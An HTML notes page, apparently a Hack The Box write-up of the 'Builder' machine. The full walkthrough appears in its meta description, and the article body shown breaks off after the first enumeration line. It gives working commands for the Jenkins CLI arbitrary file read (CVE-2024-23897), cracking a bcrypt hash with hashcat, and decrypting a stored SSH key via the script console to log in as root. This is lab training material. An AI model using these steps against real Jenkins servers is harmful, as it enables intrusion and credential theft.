<!DOCTYPE html>
<html lang="en"><head><title>Builder</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:title" content="Builder"/><meta property="og:description" content="Builder Difficulty: Medium OS: Linux Date: 2024-03-07 Completed:complete Enumeration The target is listening on only ports 22 and 8080. The service which is running on 8080 is Jenkins (10.0.18) sudo nmap -p- --min-rate 10000 -oA scans/tcp_allports builder.htb .. PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy .. sudo nmap -p 22,8080 -sC -sV -oA scans/tcp_scripts builder.htb .. PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 8080/tcp open http Jetty 10.0.18 |_http-title: Dashboard [Jenkins] | http-robots.txt: 1 disallowed entry |_/ | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Jetty(10.0.18) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel .. There are no hidden files or VHOSTs, etc., just the Jenkins page. Foothold The CVE used to exploit Jenkins CLI CVE-2024-23897 For the Jenkins version running the jenkins-cli can be exploited by downloading the jenkins-cli.jar off the website then using that to get a foothold. Download jenkins-cli Download: wget builder.htb:8080/jnlpJars/jenkins-cli.jar Usage: java -jar jenkins-cli.jar -s &amp;#039;http://10.10.11.10:8080&amp;#039; help Get Commands list Get all help command: The sed is looking for 2 spaces and to remove them. java -jar jenkins-cli.jar -s builder.htb:8080 help 2&amp;gt;&amp;amp;1 | sed -n &amp;#039;/[A-Z]/!s/ *//gp&amp;#039; add-job-to-view build cancel-quiet-down clear-queue connect-node console copy-job create-credentials-by-xml .. Execute Command list head commands.txt | xargs -I {} sh -c &amp;quot;java -jar jenkins-cli.jar -s builder.htb:8080 &amp;#039;{}&amp;#039; @/etc/passwd &amp;gt; &amp;#039;cmd/{}.out&amp;#039; 2&amp;gt;&amp;amp;1&amp;quot; The command with the largest output was the connect-node command: find cmd | xargs wc -l | sort -nr | head wc: cmd: Is a directory 63 total 22 cmd/connect-node.out 7 cmd/create-credentials-by-xml.out 6 cmd/create-job.out 6 cmd/create-credentials-domain-by-xml.out 5 cmd/clear-queue.out 5 cmd/cancel-quiet-down.out 3 cmd/copy-job.out 3 cmd/console.out 3 cmd/build.out Getting Access to user The users.xml was found my looking through the Jenkins documentation page and I can across this resource which details that the users information had been migrated to /users/users.xml below you can see the output of going to that file. For getting the actual user information I was about to find this security update which details how the user migration was taking place for upgrading to Jenkins LTS 2.138.x. It shows that “In this case, rename the directory $JENKINS_HOME/users/admin_6635238516816951048/” which is how I was about to find jennifers hash. Jenkins stores its users in /var/jenkins_home/users/users.xml this is where I found jennifer_12108429903186576833 java -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/users.xml .. &amp;lt;?xml version=&amp;#039;1.1&amp;#039; encoding=&amp;#039;UTF-8&amp;#039;?&amp;gt;: No such agent &amp;quot;&amp;lt;?xml version=&amp;#039;1.1&amp;#039; encoding=&amp;#039;UTF-8&amp;#039;?&amp;gt;&amp;quot; exists. &amp;lt;string&amp;gt;jennifer_12108429903186576833&amp;lt;/string&amp;gt;: No such agent &amp;quot; &amp;lt;string&amp;gt;jennifer_12108429903186576833&amp;lt;/string&amp;gt;&amp;quot; exists. &amp;lt;idToDirectoryNameMap class=&amp;quot;concurrent-hash-map&amp;quot;&amp;gt;: No such agent &amp;quot; &amp;lt;idToDirectoryNameMap class=&amp;quot;concurrent-hash-map&amp;quot;&amp;gt;&amp;quot; exists. &amp;lt;entry&amp;gt;: No such agent &amp;quot; &amp;lt;entry&amp;gt;&amp;quot; exists. &amp;lt;string&amp;gt;jennifer&amp;lt;/string&amp;gt;: No such agent &amp;quot; &amp;lt;string&amp;gt;jennifer&amp;lt;/string&amp;gt;&amp;quot; exists. &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;: No such agent &amp;quot; &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;&amp;quot; exists. &amp;lt;/hudson.model.UserIdMapper&amp;gt;: No such agent &amp;quot;&amp;lt;/hudson.model.UserIdMapper&amp;gt;&amp;quot; exists. &amp;lt;/idToDirectoryNameMap&amp;gt;: No such agent &amp;quot; &amp;lt;/idToDirectoryNameMap&amp;gt;&amp;quot; exists. &amp;lt;hudson.model.UserIdMapper&amp;gt;: No such agent &amp;quot;&amp;lt;hudson.model.UserIdMapper&amp;gt;&amp;quot; exists. &amp;lt;/entry&amp;gt;: No such agent &amp;quot; &amp;lt;/entry&amp;gt;&amp;quot; exists. .. Using jennifer_12108429903186576833 in the path for user configs /var/jenkins_home/users/jennifer_12108429903186576833/config.xml we find in this file at the end there is a password hash. java -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml .. &amp;lt;passwordHash&amp;gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&amp;lt;/passwordHash&amp;gt;: No such agent &amp;quot; &amp;lt;passwordHash&amp;gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&amp;lt;/passwordHash&amp;gt;&amp;quot; exists. .. I took this has and made the file below: cat jennifer_hash jennifer:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a Then I used the hashcat command. Which cracked the password which came out to princess. With this password I am about to log into the Jenkins webpage as Jennifer. $ hashcat -m 3200 jennifer_hash --user /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt .. $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess .. User After logging into the Jenkins webpage I started digging around and came across the root user configuration. After trying to play with the update credentials I started digging in the html and was able to find: The key will be pretty long: &amp;lt;input name=&amp;quot;_.privateKey&amp;quot; type=&amp;quot;hidden&amp;quot; value=&amp;quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&amp;quot;&amp;gt;&amp;lt;/div&amp;gt; From here going the /script and doing the following from here println( hudson.util.Secret.decrypt(&amp;quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&amp;quot;) ) This will output the private key: Privilege Escalation From getting the ssh key we can copy the private key to host system and make a keyfile: kali@kali:~/htb$ vim builder-key kali@kali:~/htb$ chmod 600 builder-key kali@kali:~/htb$ ssh -i builder-key root@builder.htb root@builder:~# ls root.txt If we look in the directory /home/jennifer we will find: root@builder:~# ls -la /home/jennifer/ total 28 drwxr-x--- 3 jennifer jennifer 4096 Feb 9 15:45 . drwxr-xr-x 3 root root 4096 Feb 9 15:45 . lrwxrwxrwx 1 root root 9 Feb 9 14:31 .bash_history -&amp;gt; /dev/null -rw-r--r-- 1 jennifer jennifer 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 jennifer jennifer 3771 Jan 6 2022 .bashrc drwx------ 2 jennifer jennifer 4096 Feb 9 15:45 .cache -rw-r--r-- 1 jennifer jennifer 807 Jan 6 2022 .profile -rw-r----- 1 root jennifer 33 Mar 8 05:02 user.txt."/><meta property="og:image" content="https://quartz.paulgleason.dev/static/og-image.png"/><meta property="og:width" content="1200"/><meta property="og:height" content="675"/><link rel="icon" href="../../../static/icon.png"/><meta name="description" content="Builder Difficulty: Medium OS: Linux Date: 2024-03-07 Completed:complete Enumeration The target is listening on only ports 22 and 8080. The service which is running on 8080 is Jenkins (10.0.18) sudo nmap -p- --min-rate 10000 -oA scans/tcp_allports builder.htb .. PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy .. sudo nmap -p 22,8080 -sC -sV -oA scans/tcp_scripts builder.htb .. PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 8080/tcp open http Jetty 10.0.18 |_http-title: Dashboard [Jenkins] | http-robots.txt: 1 disallowed entry |_/ | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Jetty(10.0.18) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel .. There are no hidden files or VHOSTs, etc., just the Jenkins page. Foothold The CVE used to exploit Jenkins CLI CVE-2024-23897 For the Jenkins version running the jenkins-cli can be exploited by downloading the jenkins-cli.jar off the website then using that to get a foothold. Download jenkins-cli Download: wget builder.htb:8080/jnlpJars/jenkins-cli.jar Usage: java -jar jenkins-cli.jar -s &amp;#039;http://10.10.11.10:8080&amp;#039; help Get Commands list Get all help command: The sed is looking for 2 spaces and to remove them. java -jar jenkins-cli.jar -s builder.htb:8080 help 2&amp;gt;&amp;amp;1 | sed -n &amp;#039;/[A-Z]/!s/ *//gp&amp;#039; add-job-to-view build cancel-quiet-down clear-queue connect-node console copy-job create-credentials-by-xml .. Execute Command list head commands.txt | xargs -I {} sh -c &amp;quot;java -jar jenkins-cli.jar -s builder.htb:8080 &amp;#039;{}&amp;#039; @/etc/passwd &amp;gt; &amp;#039;cmd/{}.out&amp;#039; 2&amp;gt;&amp;amp;1&amp;quot; The command with the largest output was the connect-node command: find cmd | xargs wc -l | sort -nr | head wc: cmd: Is a directory 63 total 22 cmd/connect-node.out 7 cmd/create-credentials-by-xml.out 6 cmd/create-job.out 6 cmd/create-credentials-domain-by-xml.out 5 cmd/clear-queue.out 5 cmd/cancel-quiet-down.out 3 cmd/copy-job.out 3 cmd/console.out 3 cmd/build.out Getting Access to user The users.xml was found my looking through the Jenkins documentation page and I can across this resource which details that the users information had been migrated to /users/users.xml below you can see the output of going to that file. For getting the actual user information I was about to find this security update which details how the user migration was taking place for upgrading to Jenkins LTS 2.138.x. It shows that “In this case, rename the directory $JENKINS_HOME/users/admin_6635238516816951048/” which is how I was about to find jennifers hash. Jenkins stores its users in /var/jenkins_home/users/users.xml this is where I found jennifer_12108429903186576833 java -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/users.xml .. &amp;lt;?xml version=&amp;#039;1.1&amp;#039; encoding=&amp;#039;UTF-8&amp;#039;?&amp;gt;: No such agent &amp;quot;&amp;lt;?xml version=&amp;#039;1.1&amp;#039; encoding=&amp;#039;UTF-8&amp;#039;?&amp;gt;&amp;quot; exists. &amp;lt;string&amp;gt;jennifer_12108429903186576833&amp;lt;/string&amp;gt;: No such agent &amp;quot; &amp;lt;string&amp;gt;jennifer_12108429903186576833&amp;lt;/string&amp;gt;&amp;quot; exists. &amp;lt;idToDirectoryNameMap class=&amp;quot;concurrent-hash-map&amp;quot;&amp;gt;: No such agent &amp;quot; &amp;lt;idToDirectoryNameMap class=&amp;quot;concurrent-hash-map&amp;quot;&amp;gt;&amp;quot; exists. &amp;lt;entry&amp;gt;: No such agent &amp;quot; &amp;lt;entry&amp;gt;&amp;quot; exists. &amp;lt;string&amp;gt;jennifer&amp;lt;/string&amp;gt;: No such agent &amp;quot; &amp;lt;string&amp;gt;jennifer&amp;lt;/string&amp;gt;&amp;quot; exists. &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;: No such agent &amp;quot; &amp;lt;version&amp;gt;1&amp;lt;/version&amp;gt;&amp;quot; exists. &amp;lt;/hudson.model.UserIdMapper&amp;gt;: No such agent &amp;quot;&amp;lt;/hudson.model.UserIdMapper&amp;gt;&amp;quot; exists. &amp;lt;/idToDirectoryNameMap&amp;gt;: No such agent &amp;quot; &amp;lt;/idToDirectoryNameMap&amp;gt;&amp;quot; exists. &amp;lt;hudson.model.UserIdMapper&amp;gt;: No such agent &amp;quot;&amp;lt;hudson.model.UserIdMapper&amp;gt;&amp;quot; exists. &amp;lt;/entry&amp;gt;: No such agent &amp;quot; &amp;lt;/entry&amp;gt;&amp;quot; exists. .. Using jennifer_12108429903186576833 in the path for user configs /var/jenkins_home/users/jennifer_12108429903186576833/config.xml we find in this file at the end there is a password hash. java -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml .. &amp;lt;passwordHash&amp;gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&amp;lt;/passwordHash&amp;gt;: No such agent &amp;quot; &amp;lt;passwordHash&amp;gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&amp;lt;/passwordHash&amp;gt;&amp;quot; exists. .. I took this has and made the file below: cat jennifer_hash jennifer:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a Then I used the hashcat command. Which cracked the password which came out to princess. With this password I am about to log into the Jenkins webpage as Jennifer. $ hashcat -m 3200 jennifer_hash --user /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt .. $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess .. User After logging into the Jenkins webpage I started digging around and came across the root user configuration. After trying to play with the update credentials I started digging in the html and was able to find: The key will be pretty long: &amp;lt;input name=&amp;quot;_.privateKey&amp;quot; type=&amp;quot;hidden&amp;quot; value=&amp;quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&amp;quot;&amp;gt;&amp;lt;/div&amp;gt; From here going the /script and doing the following from here println( hudson.util.Secret.decrypt(&amp;quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&amp;quot;) ) This will output the private key: Privilege Escalation From getting the ssh key we can copy the private key to host system and make a keyfile: kali@kali:~/htb$ vim builder-key kali@kali:~/htb$ chmod 600 builder-key kali@kali:~/htb$ ssh -i builder-key root@builder.htb root@builder:~# ls root.txt If we look in the directory /home/jennifer we will find: root@builder:~# ls -la /home/jennifer/ total 28 drwxr-x--- 3 jennifer jennifer 4096 Feb 9 15:45 . drwxr-xr-x 3 root root 4096 Feb 9 15:45 . lrwxrwxrwx 1 root root 9 Feb 9 14:31 .bash_history -&amp;gt; /dev/null -rw-r--r-- 1 jennifer jennifer 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 jennifer jennifer 3771 Jan 6 2022 .bashrc drwx------ 2 jennifer jennifer 4096 Feb 9 15:45 .cache -rw-r--r-- 1 jennifer jennifer 807 Jan 6 2022 .profile -rw-r----- 1 root jennifer 33 Mar 8 05:02 user.txt."/><meta name="generator" content="Quartz"/><link href="../../../index.css" rel="stylesheet" type="text/css" spa-preserve/><link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css" rel="stylesheet" type="text/css" spa-preserve/><link href="https://fonts.googleapis.com/css2?family=JetBrains Mono&amp;family=Schibsted Grotesk:wght@400;700&amp;family=Inter:ital,wght@0,400;0,600;1,400;1,600&amp;display=swap" rel="stylesheet" type="text/css" spa-preserve/><script src="../../../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../../../static/contentIndex.json").then(data => data.json())</script></head><body data-slug="everything/Cyber/HTB/htb-builder"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><h1 class="page-title"><a href="../../..">Paul's Docs</a></h1><div class="spacer mobile-only"></div><div class="search"><div id="search-icon"><p>Search</p><div></div><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search</title><desc id="desc">Search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></div><div id="search-container"><div id="search-space"><input autocomplete="off" id="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div id="search-layout" data-preview="true"></div></div></div></div><div class="darkmode"><input class="toggle" id="darkmode-toggle" type="checkbox" tabindex="-1"/><label id="toggle-label-light" for="darkmode-toggle" tabindex="-1"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg></label><label id="toggle-label-dark" for="darkmode-toggle" tabindex="-1"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></label></div><div class="explorer desktop-only"><button type="button" id="explorer" data-behavior="collapse" data-collapsed="collapsed" data-savestate="true" data-tree="[{&quot;path&quot;:&quot;everything&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/Cyber&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/Cyber/HTB&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/Refernces&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/School&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/School/Undergrad---Champlain&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/School/Undergrad---Champlain/Classes&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/School/Undergrad---Champlain/Clubs&quot;,&quot;collapsed&quot;:true},{&quot;path&quot;:&quot;everything/School/Undergrad---Champlain/Clubs/CCDC&quot;,&quot;collapsed&quot;:true}]"><h1>Explorer</h1><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-content"><ul class="overflow" id="explorer-ul"><li><div class="folder-outer open"><ul style="padding-left:0;" class="content" data-folderul><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything"><button class="folder-button"><span class="folder-title">everything</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/Cyber"><button class="folder-button"><span class="folder-title">Cyber</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/Cyber"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/Cyber/HTB"><button class="folder-button"><span class="folder-title">HTB</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/Cyber/HTB"><li><a href="../../../everything/Cyber/HTB/htb-challenge-ancient-encodings" data-for="everything/Cyber/HTB/htb-challenge-ancient-encodings">ancient-encodings</a></li><li><a href="../../../everything/Cyber/HTB/htb-builder" data-for="everything/Cyber/HTB/htb-builder">Builder</a></li></ul></div></li><li><a href="../../../everything/Cyber/011---HTB" data-for="everything/Cyber/011---HTB">011 - HTB</a></li></ul></div></li><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/Refernces"><button class="folder-button"><span class="folder-title">Refernces</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/Refernces"><li><a href="../../../everything/Refernces/Kitty" data-for="everything/Refernces/Kitty">Kitty</a></li><li><a href="../../../everything/Refernces/Neovim" data-for="everything/Refernces/Neovim">Neovim</a></li><li><a href="../../../everything/Refernces/NMAP" data-for="everything/Refernces/NMAP">NMAP</a></li><li><a href="../../../everything/Refernces/Obsidian" data-for="everything/Refernces/Obsidian">Obsidian</a></li><li><a href="../../../everything/Refernces/Vim" data-for="everything/Refernces/Vim">Vim</a></li></ul></div></li><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/School"><button class="folder-button"><span class="folder-title">School</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/School"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/School/Undergrad---Champlain"><button class="folder-button"><span class="folder-title">Undergrad - Champlain</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/School/Undergrad---Champlain"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/School/Undergrad---Champlain/Classes"><button class="folder-button"><span class="folder-title">Classes</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/School/Undergrad---Champlain/Classes"><li><a href="../../../everything/School/Undergrad---Champlain/Classes/Class-Dashboard" data-for="everything/School/Undergrad---Champlain/Classes/Class-Dashboard">Class Dashboard</a></li></ul></div></li><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/School/Undergrad---Champlain/Clubs"><button class="folder-button"><span class="folder-title">Clubs</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/School/Undergrad---Champlain/Clubs"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div data-folderpath="everything/School/Undergrad---Champlain/Clubs/CCDC"><button class="folder-button"><span class="folder-title">CCDC</span></button></div></div><div class="folder-outer "><ul style="padding-left:1.4rem;" class="content" data-folderul="everything/School/Undergrad---Champlain/Clubs/CCDC"><li><a href="../../../everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Dashboard" data-for="everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Dashboard">CCDC Dashboard</a></li><li><a href="../../../everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Linux-Threat-Hunting" data-for="everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Linux-Threat-Hunting">Linux threat Hunting</a></li></ul></div></li><li><a href="../../../everything/School/Undergrad---Champlain/Clubs/Clubs-Dashboard" data-for="everything/School/Undergrad---Champlain/Clubs/Clubs-Dashboard">Clubs Dashboard</a></li></ul></div></li></ul></div></li></ul></div></li></ul></div></li><li><div class="folder-outer "><ul style="padding-left:0;" class="content" data-folderul></ul></div></li><li><a href="../../../010-Cyber" data-for="010-Cyber">010 Cyber</a></li><li><a href="../../../020-Undergrad---Champlain" data-for="020-Undergrad---Champlain">020 Undergrad - Champlain</a></li><li><a href="../../../100-References" data-for="100-References">100 References</a></li><li><a href="../../../Dashboard" data-for="Dashboard">Dashboard</a></li></ul></div></li><li id="explorer-end"></li></ul></div></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../../../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../everything/">everything</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../everything/Cyber/">Cyber</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../everything/Cyber/HTB/">HTB</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>Builder</a></div></nav><h1 class="article-title">Builder</h1><p class="content-meta">Mar 20, 2024, 4 min read</p><ul class="tags"><li><a href="../../../tags/htb/os/linux" class="internal tag-link">htb/os/linux</a></li><li><a href="../../../tags/htb/box/medium" class="internal tag-link">htb/box/medium</a></li><li><a href="../../../tags/htb/complete" class="internal tag-link">htb/complete</a></li></ul></div></div><article class="popover-hint"><h1 id="builder">Builder<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#builder" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<blockquote>
<p>Difficulty: Medium<br/>
OS: Linux<br/>
Date: 2024-03-07<br/>
Completed:<a href="../../.././../../tags/htb/complete" class="tag-link internal alias" data-slug="tags/htb/complete">complete</a></p>
</blockquote>
<h1 id="enumeration">Enumeration<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#enumeration" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<p>The target is listening on only ports 22 and 8080. The service which is running on 8080 is Jenkins (10.0.18)</p>
